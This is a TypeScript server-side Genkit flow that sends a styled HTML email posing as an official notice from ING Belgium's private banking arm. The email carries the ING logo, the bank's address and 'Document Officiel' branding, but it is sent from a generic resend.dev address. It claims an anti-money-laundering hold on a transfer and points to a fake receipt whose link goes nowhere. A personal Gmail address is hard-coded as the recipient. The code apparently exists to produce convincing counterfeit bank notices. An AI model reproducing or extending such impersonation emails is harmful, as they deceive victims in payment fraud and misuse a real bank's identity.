
'use server';
/**
 * @fileOverview A flow for sending high-fidelity transaction notification emails.
 *
 * - sendTransactionEmail - A function that handles sending the email.
 */

import { ai } from '@/ai/genkit';
import { z } from 'zod';
import { Resend } from 'resend';
import { EmailFlowInputSchema } from '@/app/(app)/transfer/types';
import type { EmailFlowInput } from '@/app/(app)/transfer/types';


// This is the exported function that the client-side code will call.
export async function sendTransactionEmail(input: EmailFlowInput): Promise<void> {
  await emailFlow(input);
}

// Define the Genkit flow
const emailFlow = ai.defineFlow(
  {
    name: 'emailFlow',
    inputSchema: EmailFlowInputSchema,
    outputSchema: z.void(),
  },
  async (input) => {
    const apiKey = process.env.RESEND_API_KEY;
    if (!apiKey) {
      console.error('Resend API key is missing. Please set the RESEND_API_KEY environment variable.');
      throw new Error('Email service is not configured.');
    }
    
    const resend = new Resend(apiKey);
    const { recipientName, amount, iban, description, date, transferType, fee, totalAmount } = input;
    
    const transactionId = Math.random().toString(36).substring(7).toUpperCase();
    const formattedDate = new Date(date).toLocaleString('fr-BE', {
      day: '2-digit',
      month: 'long',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });

    // In a real app, you would get the user's email from their session/database.
    const userEmail = 'franckenock78@gmail.com'; 

    try {
      await resend.emails.send({
        from: 'ING Private Banking <onboarding@resend.dev>',
        to: userEmail,
        subject: `AVIS DE SÉCURITÉ : Ordre de Virement Suspendu - RÉF: #TRX-${transactionId}`,
        html: `
          <div style="margin: 0; padding: 0; width: 100%; background-color: #f1f3f5; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; color: #1a1a1a;">
            <div style="max-width: 650px; margin: 40px auto; background-color: #ffffff; border-radius: 0; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #ff6200;">
              
              <!-- Official Header -->
              <div style="padding: 30px 40px; border-bottom: 1px solid #eee; background-color: #fff;">
                <table width="100%">
                  <tr>
                    <td>
                      <img src="https://i.imgur.com/WWZ10oQ.png" alt="ING Logo" width="100" style="display: block;"/>
                    </td>
                    <td align="right" style="font-size: 11px; color: #999; text-transform: uppercase; letter-spacing: 1px; font-weight: bold;">
                      Document Officiel • Private Banking
                    </td>
                  </tr>
                </table>
              </div>

              <!-- Main Content -->
              <div style="padding: 40px;">
                <div style="background-color: #FFF2F0; border: 1px solid #FFCCC7; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center;">
                  <h1 style="color: #CF1322; font-size: 24px; margin: 0 0 10px 0; font-weight: 800; text-transform: uppercase; letter-spacing: -0.5px;">Transaction Suspendue par le Système de Sécurité</h1>
                  <p style="color: #CF1322; font-size: 14px; margin: 0; font-weight: 600;">Référence d'alerte : SafeGuard-AE-${transactionId}</p>
                </div>

                <p style="font-size: 16px; line-height: 1.6; color: #333; margin-bottom: 30px;">
                  Cher Client, <br><br>
                  Nous vous informons que votre ordre de virement, initié le <strong>${formattedDate}</strong>, a été temporairement suspendu par notre département de lutte contre la fraude et le blanchiment de capitaux (AML).
                </p>

                <!-- Surrealist Data Table -->
                <div style="background-color: #fafafa; border: 1px solid #eee; border-radius: 12px; padding: 30px; margin-bottom: 30px;">
                  <h2 style="font-size: 14px; color: #ff6200; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 20px 0; border-bottom: 2px solid #ff6200; display: inline-block; padding-bottom: 5px;">Récapitulatif de l'ordre</h2>
                  
                  <table width="100%" cellpadding="0" cellspacing="0" style="font-size: 14px; border-collapse: collapse;">
                    <tr style="border-bottom: 1px solid #eee;">
                      <td style="padding: 12px 0; color: #666;">Bénéficiaire</td>
                      <td style="padding: 12px 0; text-align: right; font-weight: 700; color: #1a1a1a;">${recipientName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #eee;">
                      <td style="padding: 12px 0; color: #666;">IBAN Destination</td>
                      <td style="padding: 12px 0; text-align: right; font-weight: 700; color: #1a1a1a; font-family: 'Courier New', monospace;">${iban}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #eee;">
                      <td style="padding: 12px 0; color: #666;">Montant Principal</td>
                      <td style="padding: 12px 0; text-align: right; font-weight: 700; color: #1a1a1a;">€${amount.toFixed(2)}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #eee;">
                      <td style="padding: 12px 0; color: #666;">Frais Bancaires (${transferType})</td>
                      <td style="padding: 12px 0; text-align: right; font-weight: 700; color: #1a1a1a;">€${fee.toFixed(2)}</td>
                    </tr>
                    <tr>
                      <td style="padding: 15px 0; color: #1a1a1a; font-weight: 800; font-size: 16px;">Total débité (suspendu)</td>
                      <td style="padding: 15px 0; text-align: right; font-weight: 800; color: #CF1322; font-size: 20px;">€${totalAmount.toFixed(2)}</td>
                    </tr>
                  </table>
                </div>

                <!-- Receipt Placeholder Simulation -->
                <div style="background-image: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%); border: 2px dashed #ccc; padding: 30px; text-align: center; border-radius: 12px; margin-bottom: 30px;">
                  <img src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773745069/Capture_d_%C3%A9cran_2026-03-17_104810_ovk3l7.png" width="60" style="opacity: 0.2; margin-bottom: 15px;"/>
                  <h3 style="margin: 0 0 10px 0; font-size: 16px; color: #333;">REÇU OFFICIEL GÉNÉRÉ</h3>
                  <p style="font-size: 12px; color: #666; margin-bottom: 20px;">Le reçu de transaction #${transactionId}.pdf est joint à cet email.</p>
                  <a href="#" style="background-color: #333; color: #fff; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 13px; display: inline-block;">CONSULTER LE REÇU NUMÉRIQUE</a>
                </div>

                <div style="background-color: #F6FFED; border: 1px solid #B7EB8F; padding: 20px; border-radius: 8px;">
                  <h4 style="margin: 0 0 10px 0; color: #389E0D; font-size: 16px;">Note de conformité</h4>
                  <p style="margin: 0; font-size: 13px; color: #52C41A; line-height: 1.5;">
                    Cette mesure est une protection standard pour votre patrimoine. Aucun fonds n'a quitté votre compte définitivement. Ils sont actuellement en attente de validation dans notre chambre de compensation sécurisée.
                  </p>
                </div>

              </div>

              <!-- Footer -->
              <div style="background-color: #f9f9f9; padding: 30px 40px; border-top: 1px solid #eee; text-align: center;">
                <p style="font-size: 11px; color: #999; margin-bottom: 15px; line-height: 1.6;">
                  © ING Belgium SA/NV, Avenue Marnix 24, B-1000 Bruxelles. <br>
                  Ce message est confidentiel et destiné uniquement à son destinataire. <br>
                  Référence d'archive légale : ARCH-${Date.now()}
                </p>
                <div style="display: inline-block; padding: 5px 15px; background-color: #eee; border-radius: 20px; color: #666; font-size: 10px; font-weight: bold;">
                  SÉCURISÉ PAR ING SAFEGUARD
                </div>
              </div>

            </div>
          </div>
        `,
      });
      console.log('High-fidelity blocking email sent with receipt simulation.');
    } catch (error) {
      console.error('Error sending detailed email:', error);
      throw new Error('Failed to send notification email.');
    }
  }
);
